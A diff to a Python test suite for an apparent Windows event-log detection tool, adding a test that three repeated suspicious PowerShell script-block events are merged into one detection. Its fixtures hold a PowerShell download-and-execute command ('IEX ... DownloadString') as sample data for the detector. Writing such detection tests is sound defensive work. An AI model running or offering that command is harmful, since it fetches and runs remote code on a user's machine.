@@ -1,3 +1,4 @@
+import json
 import uuid
 from datetime import datetime, timedelta
 
@@ -129,6 +130,26 @@ def test_service_inside_system32_not_flagged(db_session):
     run_detection(db_session)
 
     assert "New service installed outside trusted paths" not in _rule_names(db_session)
+
+
+def test_repeated_filter_rule_hits_grouped_into_one_detection(db_session):
+    for i in range(3):
+        db_session.add(
+            _event(
+                4104,
+                minutes=i,
+                channel="Microsoft-Windows-PowerShell/Operational",
+                command_line="IEX (New-Object Net.WebClient).DownloadString('http://x')",
+            )
+        )
+    db_session.commit()
+
+    run_detection(db_session)
+
+    detections = db_session.query(Detection).filter(Detection.rule_name == "Suspicious PowerShell script block").all()
+    assert len(detections) == 1
+    assert detections[0].event_count == 3
+    assert len(json.loads(detections[0].matched_event_ids)) == 3
 
 
 def test_log_cleared_detected(db_session):
